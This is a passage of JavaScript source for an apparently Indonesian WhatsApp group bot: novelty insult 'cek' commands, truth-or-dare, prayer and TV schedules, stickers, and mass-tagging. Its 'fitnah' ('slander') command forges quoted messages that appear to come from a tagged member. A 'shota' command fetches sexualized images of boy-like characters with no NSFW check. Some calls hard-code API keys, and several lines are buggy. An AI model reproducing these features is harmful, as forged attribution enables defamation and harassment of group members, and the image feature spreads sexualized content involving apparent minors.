                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *BABIAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🤪`
                    reply(N)
                    break                                                   
                    case 'bebancek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)
                    N = `KE *BEBANAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🤬`
                    reply(N)
                    break                                                   
                    case 'baikcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *BAIKAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 😇`
                    reply(N)
                    break                                                   
                    case 'jahatcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *JAHATAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 😈`
                    reply(N)
                    break                                                   
                    case 'anjingcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *ANJINGAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 👀`
                    reply(N)
                    break                                                                        
                    case 'haramcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)
                    N = `KE *HARAMAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🥴`
                    reply(N)
                    break                                                    
                    case 'kontolcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *KOMTOLAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🙂`
                    reply(N)
                    break                                                   
                    case 'pakboycek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *PAKBOYZ* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 😏`
                    reply(N)
                    break                                                   
                    case 'pakgirlcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)	
                    N = `KE *PAKGILR* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 😏`
                    reply(N)
                    break                                                               
                    case 'sangecek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)
                    N = `JIWA *SANGE* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🤤`
                    reply(N)
                    break                                                  
                    case 'getpict':

					if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await zaki.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            zaki.sendMessage(from, pict, image, {quoted: mek})
            break                                                  
        
          case 'bapercek':
                    if (!isRegister) return reply(mess.only.daftarB)
                    N = `JIWA *BEPERAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 😘`
                    reply(N)
                    break                                                       
                    case 'ganteng': case 'cantik': case 'jelek': case 'goblok':  
                   case 'bego': case 'pinter': case 'jago': case 'nolep': case 'monyet':                 	 
                   case 'babi': case 'beban': case 'baik': case 'jahat': case 'anjing': 
                   case 'haram': case 'kontol': case 'pakboy': case 'pakgirl': 
               	   case 'wibu': case 'hebat': case 'sadboy': case 'sadgirl':  
               	   if (!isRegister) return reply(mess.only.daftarB)
				   if (!isGroup) return reply(`GROUP ONLY`)
 				   jds = []
				   const A1 = groupMembers
  		 		   const B1 = groupMembers
 				   const C1 = A1[Math.floor(Math.random() * A1.length)]
				   D1 = `yang *ter${command}* disini adalah @${C1.jid.split('@')[0]}`                  
				   jds.push(C1.jid)
				   mentions(D1, jds, true)
				   break                                                  
				   case 'jadian':
				   if (!isRegister) return reply(mess.only.daftarB)
				   if (!isGroup) return reply(`GROUP ONLY`)
 				   jds = []
				   const A11 = groupMembers
  		 		   const B11 = groupMembers
 				   const C11 = A11[Math.floor(Math.random() * A11.length)] 				   
 				   const C22 = B11[Math.floor(Math.random() * B11.length)]
				   D11 = `Cieee @${C11.jid.split('@')[0]} ❤ @${C22.jid.split('@')[0]}\nSELAMAT MENEMPUH KEHIDUPAN BARU!!`                  
				   jds.push(C11.jid)
				   jds.push(C22.jid)
				   mentions(D11, jds, true)
				   break                                                  
//ENDKERANGMENU
                                case 'nsfwneko':
				    try{
						if (!isNsfw) return reply('*NSFW MATI*')
                                                if (!isRegister) return reply(mess.only.daftarB)
                                                if (isLimit(sender)) return reply(ind.limitend(pushname))
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko?apikey=${apitobz}`, {method: 'get'})
						buffer = await getBuffer(res.result)
						zaki.sendMessage(from, buffer, image, {quoted: mek, caption: 'mesum'})
                                                await limitAdd(sender)
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('*ERROR*')
					}
					break                                                  
                                case 'shota':
				    try{
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/randomshota?apikey=ZTKPzA3p3PDYY60uySUv`, {method: 'get'})
						buffer = await getBuffer(res.result)
                                                if (!isRegister) return reply(mess.only.daftarB)
                                                if (isLimit(sender)) return reply(ind.limitend(pushname))
						zaki.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nich'})
                                                await limitAdd(sender)
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('*ERROR*')
					}
					break                                                  
				
                                 case 'nsfw':
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('fitur sudah aktif')
						nsfw.push(from)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply('SUCCSESS mengaktifkan fitur nsfw di group ini')
					} else if (Number(args[0]) === 0) {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply('SUCCSESS  menonaktifkan fitur nsfw di group ini')
					} else {
						reply('ketik 1 untuk mengaktifkan, 0 untuk menonaktifkan fitur')
					}
					break                                                  	
			    
					
                                case 'delete':
					case 'del':
					if (!isGroup)return reply(mess.only.group)
                                        if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroupAdmins)return reply(mess.only.admin)
					zaki.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break                                                  
                                case 'phlogo':
					var gh = body.slice(7)
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					if (args.length < 1) return reply('Teksnya mana um\nContoh: ${prefix}phlogo HLX|BOT')
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					reply (mess.wait)
					buffer = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${gbl1}&text2=${gbl2}&apikey=${apizeks}`, {method: 'get'}) 

					zaki.sendMessage(from, buffer, image, {quoted: mek})
                                        await limitAdd(sender)
					break                                                  
                case 'truth':
					const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					zaki.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
					break                                                  
                                case 'dare':
				if (!isRegister) return reply(mess.only.daftarB)
				const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u zaki?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
				  der = dare[Math.floor(Math.random() * dare.length)]
					tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					zaki.sendMessage(from, tod, image, { quoted: mek, caption: '*Dare*\n\n'+ der, uotedd: mek })
					await limitAdd(sender)
					break                                                  
                case 'level':
                if (!isLevelingOn) return reply(mess.levelnoton)
                if (!isGroup) return fakeimage(mess.only.group)
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(mess.levelnol)
                sem = sender.replace('@s.whatsapp.net','')
                resul = `〘 *LEVEL* 〙\n   ╠═➥ *Name* : ${sem}\n   ╠═➥ *User XP* : ${userXp}\n   ╚═➥ *User Level* : ${userLevel}`
               zaki.sendMessage(from, resul, text, { quoted: mek})
                .catch(async (err) => {
                        console.error(err)
                        await reply(`Error!\n${err}`)
                    })
            break                                                  
          case 'fitnah':
          if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
				  var gh = body.slice(7)
			  	mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					var replace = gh.split("|")[0];
					var target = gh.split("|")[1];
					var bot = gh.split("|")[2];
					zaki.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
					break                                                  
            case 'leveling':
                if (!isGroup) return fakeimage(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (args.length < 1) return reply('Ketik 1 untuk mengaktifkan fitur')
                if (args[0] === '1') {
                    if (isLevelingOn) return reply('*fitur level sudah aktif sebelum nya*')
                    _leveling.push(groupId)
                    fs.writeFileSync('./database/json/leveling.json', JSON.stringify(_leveling))
                     reply(mess.levelon)
                } else if (args[0] === '0') {
                    _leveling.splice(groupId, 1)
                    fs.writeFileSync('./database/json/leveling.json', JSON.stringify(_leveling))
                     reply(ind.leveloff())
                } else {
                    reply(' *Ketik perintah 1 untuk mengaktifkan, 0 untuk menonaktifkan* \n *Contoh: ${prefix}leveling 1*')
                }
            break                                                  
                                case 'infogempa':
                                        anu = await fetchJson(`https://fxc7-api.herokuapp.com/api/info/gempa?apikey=Fxc7`, {method: 'get'})
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        if (anu.error) return reply(anu.error)
                                        hasil = `*Kedalaman* : ${anu.result.Kedalaman}\n*wilayah* : ${anu.result.Wilayah}\n*Garis Bujur : ${anu.result.Bujur}\n*Magnitudo* : ${anu.result.Magnitudo}\n*Garis Lintang* : ${anu.result.Lintang}\n*Waktu* : ${anu.result.Waktu}`
                    
                     zaki.sendMessage(from, hasil, text, {quoted:mek})
                                        await limitAdd(sender)
                                        break                                                  
                                case 'nsfwtrap':
                                        try{
                                                if (!isNsfw) return reply('*NSFW MATI*')
                                                if (!isRegister) return reply(mess.only.daftarB)
                                                if (isLimit(sender)) return reply(ind.limitend(pushname))
                                                res = await fetchJson(`https://tobz-api.herokuapp.com/nsfwtrap?apikey=${apitobz}`, {method: 'get'})
                                                buffer = await getBuffer(res.result)
                                                zaki.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih gambarnya kak...'})
                                                await limitAdd(sender)
                                        } catch (e) {
                                                console.log(`*Error* :`, color(e,'red'))
                                                reply('❌ *ERROR* ❌')
                                        }
                                        break                                                  
//RUNTIME
case 'runtime':    

			   	        if (!isRegister) return reply(ind.daftarB)

                                        uptime = process.uptime()
                     
                     const aktif = kyun(uptime)
                                        zaki.updatePresence(from, Presence.composing)
                                        zaki.sendMessage(from, ` *${aktif}* `, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": `*_BOT TELAH BERJALAN SELAMA_*`, "jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg') } } } } )
                                        break                                                  
//END RUNTIME
                                case 'ping':    
			   	        if (!isRegister) return reply(ind.daftarB)
                                        const timestamp = speed();
                                        const latensi = speed() - timestamp
                                        zaki.updatePresence(from, Presence.composing)
                                        zaki.sendMessage(from, `Speed: *${latensi.toFixed(4)} _Second_* `, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": `*_Kecepatan Membelas Adalah_*`, "jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg') } } } } )
                                        break                                                  
                               
  //ISLAMMENU
                                case 'jsholat':
                                        case 'jadwalsholat':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} makassar*`)  
                   reply (mess.wait)
                   F = body.slice(14)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwalshalat?daerah=${F}`)                   
                   anu1 = `➻ *IMSYAK* : ${anu.Imsyak}\n`
                   anu1 += `➻ *SUBUH* : ${anu.Subuh}\n`
                   anu1 += `➻ *DHUHA* : ${anu.Dhuha}\n`
                   anu1 += `➻ *DZUHUR* : ${anu.Dzuhur}\n`
                   anu1 += `➻ *ASHAR* : ${anu.Ashar}\n`
                   anu1 += `➻ *MAGRHRIB* : ${anu.Maghrib}\n`
                   anu1 += `➻ *ISYA* : ${anu.Isya}\n` 
                   reply(anu1)
                   break                                                  
  case 'asmaulhusna':
					if (!isRegister) return reply(mess.only.daftarB)	
					anu = await fetchJson(`https://xteam.xyz/religi/Asmaulhusna?APIKEY=${apixteam}`)
					anu1 = `➻ *INDEX* : ${anu.result.index}\n`
					anu1 += `➻ *LATIN* : ${anu.result.latin}\n`
					anu1 += `➻ *ARAB* : ${anu.result.arabic}\n`
					anu1 += `➻ *ID* : ${anu.result.translation_id}\n`
					anu1 += `➻ *EN* : ${anu.result.translation_en}\n`					
					reply(anu1)
					break                                                  
					case 'ayatkursi':
					if (!isRegister) return reply(mess.only.daftarB)	
					anu = await fetchJson(`https://xteam.xyz/religi/ayatkursi?APIKEY=${apixteam}`)
					anu1 = `➻ *TAFSIR* : ${anu.result.data.tafsir}\n`
					anu1 += `➻ *TRANSLATION* : ${anu.result.data.translation}\n`
					anu1 += `➻ *ARABIC* : ${anu.result.data.arabic}\n`
					anu1 += `➻ *LATIN* : ${anu.result.data.latin}\n`
					reply(anu1)
					break                                                  
					case 'bacaansholat':
					if (!isRegister) return reply(mess.only.daftarB)	
					anu = await fetchJson(`https://xteam.xyz/religi/bacaansholat?APIKEY=${apixteam}`)
					anu1 = `➻ *ID* : ${anu.result.id}\n`
					anu1 += `➻ *NAME* : ${anu.result.name}\n`
					anu1 += `➻ *ARABIC* : ${anu.result.arabic}\n`
					anu1 += `➻ *LATIN* : ${anu.result.latin}\n`
					anu1 += `➻ *TERJEMAHAN* : ${anu.result.terjemahan}\n`
					reply(anu1)
					break                                                  
					case 'doaharian':
					if (!isRegister) return reply(mess.only.daftarB)	
					anu = await fetchJson(`https://xteam.xyz/religi/doaharian?APIKEY=${apixteam}`)
					anu1 = `➻ *TITLE* : ${anu.result.title}\n`
					anu1 += `➻ *ARABIC* : ${anu.result.arabic}\n`
					anu1 += `➻ *LATIN* : ${anu.result.latin}\n`
					anu1 += `➻ *TRANSLATION* : ${anu.result.translation}\n` 
					reply(anu1)
					break                                                  
					case 'kisahnabi':
					if (!isRegister) return reply(mess.only.daftarB)	
					anu = await fetchJson(`https://xteam.xyz/religi/kisahnabi?APIKEY=${apixteam}`)
					anu1 = `➻ *NAME* : ${anu.result.name}\n`
					anu1 += `➻ *KELAHIRAN* : ${anu.result.thn_kelahiran}\n`
					anu1 += `➻ *USIA* : ${anu.result.usia}\n`
					anu1 += `➻ *DESCRIPTION* : ${anu.result.description}\n`
					anu1 += `➻ *TMP* : ${anu.result.tmp}\n`
					reply(anu1)
					break                                                  
					case 'niatsholat':
					if (!isRegister) return reply(mess.only.daftarB)	
					anu = await fetchJson(`https://xteam.xyz/religi/niatsholat?APIKEY=${apixteam}`)
					anu1 = `➻ *ID* : ${anu.result.id}\n`
					anu1 += `➻ *NAME* : ${anu.result.name}\n`
					anu1 += `➻ *ARABIC* : ${anu.result.arabic}\n`
					anu1 += `➻ *LATIN* : ${anu.result.latin}\n`
					anu1 += `➻ *TERJEMAHAN* : ${anu.result.terjemahan}\n`
					reply(anu1)
					break                                                  
					case 'tahlil':
					if (!isRegister) return reply(mess.only.daftarB)	
					anu = await fetchJson(`https://xteam.xyz/religi/tahlil?APIKEY=${apixteam}`)
					anu1 = `➻ *ID* : ${anu.result.id}\n`
					anu1 += `➻ *NAME* : ${anu.result.title}\n`
					anu1 += `➻ *ARABIC* : ${anu.result.arabic}\n` 
					anu1 += `➻ *TERJEMAHAN* : ${anu.result.translation}\n`
					reply(anu1)
					break                                                  
					case 'wirid':
					if (!isRegister) return reply(mess.only.daftarB)	 
					anu = await fetchJson(`https://xteam.xyz/religi/wirid?APIKEY=${apixteam}`)
					anu1 = `➻ *ID* : ${anu.result.id}\n`
					anu1 += `➻ *TIMES* : ${anu.result.times}\n`
					anu1 += `➻ *ARABIC* : ${anu.result.arabic}\n` 
					anu1 += `➻ *TNC* : ${anu.result.tnc}\n`
					reply(anu1)
					break                                                  
//ENDISLAMMENU
                           
                                case 'jadwaltv':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwaltvnow`)
                   anu1 = `➻ *JAM* : ${anu.result.jam}\n`
                   anu1 += `➻ *JADWAL* : ${anu.result.jadwalTV}\n`
                   reply(anu1)
                   break                                                  
                   case 'tvjadwal':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} gtv*`)
                   F = body.slice(10)
                   anu1 = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwaltv?ch=${F}`)
                   anu1 = `➻ *JAM* : ${anu.result}`
                   reply(anu1)
                   break                                                  
                   case 'fml':  
                   if (!isRegister) return reply(mess.only.daftarB)	 
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fml`)
                   anu1 = `➻ *FML* : ${anu.result.fml}`
                   reply(anu1)
                   break                                                  
                   case 'cinta':  
                   if (!isRegister) return reply(mess.only.daftarB)	 
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/katacinta`)
                   anu1 = `➻ *KATA CINTA* : ${anu.result}`
                   reply(anu1)
                   break                                                                                                                              
                   case 'twich':  
                   if (!isRegister) return reply(mess.only.daftarB)	 
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/twichquote`)
                   anu1 = `➻ *THWICH* : ${anu.result}`
                   reply(anu1)
                   break                                                              
                 case 'afk':

					if (!isRegister) return reply(mess.only.daftarB)
	                if (!isGroup) return reply(mess.only.group)
                    alasan = args.join(" ")
                    afk[sender.split('@')[0]] = alasan.toLowerCase()
                    fs.writeFileSync("./database/afk.json", JSON.stringify(afk))
                    ini_txt = `\`\`\`Fitur Afk berhasil diaktifkan!\`\`\`\n\`\`\`Username:\`\`\` ${pushname}\n`
                    if (alasan != "") {
                        ini_txt += "\`\`\`Alasan:\`\`\` " + alasan
                    }
                    reply(ini_txt)
                    break                                                  
                                
                                
                                case 'randomkpop':
                                        gatauda = body.slice(6)
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        reply (mess.wait)
                                        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomkpop?apikey=${apitobz}`, {method: 'get'})
                                        buffer = await getBuffer(anu.result)
                                        zaki.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih kpopnya kak...'})
                                        await limitAdd(sender)
                                        break                                                  
                                case 'fml2':
                                        getauda = body.slice(6)
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        data = await fetchJson(`https://tobz-api.herokuapp.com/randomfmylife?apikey=${apitobz}`, {method: 'get'})
                                        hasil = `*Fuck My Life*\n${data.result}`
                                        reply(hasil)
                                        await limitAdd(sender)
                                        break                                                  
                               
                             
				 case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'attp':
		if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${lolKey}&text=${ini_txt}`)
                    zaki.sendMessage(from, ini_buffer, sticker, { quoted: mek})
                    break                                                  
                    case 'attp':
		if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Akira`)
                    teks = args.join(" ")
                    buffer = await getBuffer(`http://lolteam.herokuapp.com/api/attp?apikey=AkiraYT&text=${teks}`)
                    zaki.sendMessage(from, buffer, sticker, { quoted: mek})
                    break                                                  
	case 'imgtag':
          if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.groupo())
					if (!isGroupAdmins) return reply(mess.only.admin())
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await zaki.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group_inpo = await zaki.groupMetadata(from)
                        var member = group_inpo['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = { contextInfo: { mentionedJid: mem },
                            quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "Image Tag", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486"} } }
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        zaki.sendMessage(from, ini_buffer, image, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`reply imagenya!`)
                    }
                    break                                                  
		
					case 'getbio':
					
					if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group())
					if (args.length < 1) return reply('Tag orangnya!')
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    const p = await zaki.getStatus(`${mentioned}`, MessageType.text)
                    reply(p.status)
                    if (p.status == 401) {
                    reply("Error! mungkin diprivate")
                    }
                     break                                                  
                   case 'kontak':
					
					if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group())
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag atau nomor|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break                                                  
				case 'kontag':
				
					if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group())
					if (!isGroupAdmins) return reply(mess.only.admin())
				argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag atau nomor|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break                                                  
				 case 'mctag':
      case 'nuytag':
      case 'totag':
        if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
          encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
          file = await zaki.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
          value = args.join(" ")
          var groupajhd = await zaki.groupMetadata(from)
          var member = groupajhd['participants']
          var mem = []
          member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          var options = {
            contextInfo: {
              mentionedJid: mem
            },
            quoted: mek
          }
          ini_buffer = fs.readFileSync(file)
          zaki.sendMessage(from, ini_buffer, sticker, options)
          fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
          encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
          file = await zaki.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
          value = args.join(" ")
          var groupnajdjdj = await zaki.groupMetadata(from)
          var member = groupnajdjdj['participants']
          var mem = []
          member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          var options = {
            contextInfo: {
              mentionedJid: mem
            },
            quoted: mek
          }
          ini_buffer = fs.readFileSync(file)
          zaki.sendMessage(from, ini_buffer, image, options)
          fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
          encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
          file = await zaki.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
          value = args.join(" ")
          var groupnandnd = await zaki.groupMetadata(from)
          var member = groupnandnd['participants']
          var mem = []
          member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          var options = {
            mimetype: 'audio/mp4',
            ptt: true,
            contextInfo: {
              mentionedJid: mem
            },
            quoted: mek
          }
          ini_buffer = fs.readFileSync(file)
          zaki.sendMessage(from, ini_buffer, audio, options)
          fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
          encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
          file = await zaki.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
          value = args.join(" ")
          var groupjwjdh = await zaki.groupMetadata(from)
          var member = groupjwjdh['participants']
          var mem = []
          member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          var options = {
            mimetype: 'video/mp4',
            contextInfo: {
              mentionedJid: mem
            },
            quoted: mek
          }
          ini_buffer = fs.readFileSync(file)
          zaki.sendMessage(from, ini_buffer, video, options)
          fs.unlinkSync(file)
        } else {
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}mctag`)
        }
        break                                                  
case 'sticktag':

            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {

            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await zaki.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group_info = await zaki.groupMetadata(from)
            var member = group_info['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zaki.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*reply sticker yang sudah dikirim*`)
            }
            break                                                  
case 'snobg':
  case 'stiknobg':
        if (!isRegister) return reply(mess.only.daftarB)	

        if (isLimit(sender)) return reply(ind.limitend(pushname))
